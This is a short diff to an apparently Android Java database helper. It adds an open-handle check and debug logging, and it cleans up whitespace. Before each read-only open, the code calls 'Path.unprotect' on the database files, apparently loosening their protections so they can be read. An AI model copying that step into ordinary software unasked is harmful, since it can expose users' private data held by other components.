@@ -126,9 +126,9 @@ public class GenericSqliteHelper { // extends SQLiteOpenHelper {
 		synchronized (lockObject) {
 			db = getReadableDatabase();
 			Cursor cursor = db.rawQuery(sqlquery, selectionArgs);
-			
-			long ret = traverse(cursor, visitor, new String[] {  });
-			
+
+			long ret = traverse(cursor, visitor, new String[] {});
+
 			cursor.close();
 			cursor = null;
 
@@ -201,13 +201,19 @@ public class GenericSqliteHelper { // extends SQLiteOpenHelper {
 	}
 
 	public SQLiteDatabase getReadableDatabase() {
-		if (db != null) {
+		if (db != null && db.isOpen()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (getReadableDatabase) already opened");
+			}
 			return db;
 		}
 		try {
 			Path.unprotect(name, 3, true);
 			Path.unprotect(name + "*", true);
-			
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (getReadableDatabase) open");
+			}
 			SQLiteDatabase opened = SQLiteDatabase.openDatabase(name, null, SQLiteDatabase.OPEN_READONLY
 					| SQLiteDatabase.NO_LOCALIZED_COLLATORS);
 			return opened;
